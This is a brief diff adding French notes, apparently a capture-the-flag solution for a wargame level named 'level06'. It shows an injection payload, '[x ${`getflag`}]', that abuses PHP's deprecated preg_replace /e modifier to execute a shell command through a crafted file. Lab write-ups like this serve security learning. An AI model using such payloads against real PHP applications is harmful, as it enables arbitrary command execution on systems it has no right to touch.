@@ -1,0 +1,10 @@
+vi test.txt
+
+[x ${`getflag`}]
+
+considere tout ce qui est entre crochet [x cmd ] comme une commande
+
+il suffit de mettre la synthaxe php pour executer une commande 
+/e est une faille de securite qui a ete retiree des versions les plus recentes
+
+./level06 test.txt
